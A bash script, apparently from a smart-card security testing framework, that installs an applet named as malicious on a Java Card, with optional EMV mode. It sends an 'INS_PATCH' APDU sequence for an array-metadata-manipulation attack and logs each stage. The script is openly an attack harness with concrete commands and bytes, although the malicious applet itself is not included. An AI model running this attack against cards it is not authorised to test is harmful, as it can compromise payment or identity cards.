#!/bin/bash
source ~/.bash_aliases

function usage() {
cat << EOF
Usage: $0 options

    -a      Name of the card.
EOF
}

EMV=""
while getopts "ha:e" OPTION
do
    case "$OPTION" in
        h)
            usage
            exit 1
            ;;
        a)
            CARD_NAME="$OPTARG"
            ;;
        e)
            EMV="--emv"
            echo "Using EMV"
            ;;
    esac
done

if [[ -z "$CARD_NAME" ]]; then
    usage
    exit 1
fi

attack_id="$(echo "$(date +%s)" | sha1sum | awk '{ print $1 }')"

echo "Check applets and state"
record\
    --name "$CARD_NAME"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "check"\
    -- gp --verbose --debug --list "$EMV"

echo "Install?"
read
record\
    --name "$CARD_NAME"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "installation"\
    -- gp --verbose --debug --install com.metadatamanipulation.jc212.malicious.cap "$EMV"
# check applet state after installation
record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "check-installation"\
    -- gp --list "$EMV"

echo "Send INS_PATCH?"
read
record --name "$CARD_NAME"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "send INS_PATCH"\
    -- gp --verbose --debug --apdu 00a4040007AE000000000701 --apdu a0b4000000 "$EMV"

record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "check-send INS_PATCH"\
    -- gp --list "$EMV"

echo "Uninstall?"
read
record --name "$CARD_NAME"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "uninstallation"\
    -- gp --verbose --debug --uninstall com.metadatamanipulation.jc212.malicious.cap "$EMV"

record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "ArrayMetadataManipulation"\
    --attack-id "$attack_id"\
    --stage "check-uninstallation"\
    -- gp --list "$EMV"
